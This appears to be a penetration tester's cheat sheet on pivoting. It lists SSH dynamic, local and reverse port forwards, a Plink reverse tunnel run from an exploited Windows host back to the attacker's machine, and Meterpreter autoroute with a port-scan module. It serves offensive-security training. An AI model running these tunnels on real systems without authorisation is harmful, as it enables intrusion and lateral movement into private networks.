Useful Resource:

> https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/

> https://artkond.com/2017/03/23/pivoting-guide/

> https://netsec.ws/?p=278

### SSH 

> ssh username@10.1.1.236 -D 1080

> ssh -L 9999:10.1.1.236:80 firefart@10.11.1.251

On the exploited/rooted machine, connect back to the attacker
All Local traffic on port 6666 will forward through the host
and be forwarded on again to port 3389 on the internal network

> ssh root@10.11.0.32 -R 6666:10.1.1.224:3389



### Using Plink:

Useful Guide: https://the.earth.li/~sgtatham/putty/0.60/htmldoc/Chapter7.html

After exploiting a Windows host, run this from the command line:
This creates a tunnel back to the attacking machine
It will forward all traffic on the attacking machine, port 4444
to Port 80 on the IP specified.

> plink.exe -ssh root@YOUR_ATTACKING_MACHINE -R 127.0.0.1:4444:10.2.2.218:80





### Using Metereter

After retrieving meterpreter shell on VICTIM1:

This will create a route to the host on the new network

> run autoroute -s 10.2.2.218

Background the session

```
use auxiliary/scanner/portscan/tcp
set rhosts 10.2.2.218
set threads 50
run
```

This will do a port scan of the host


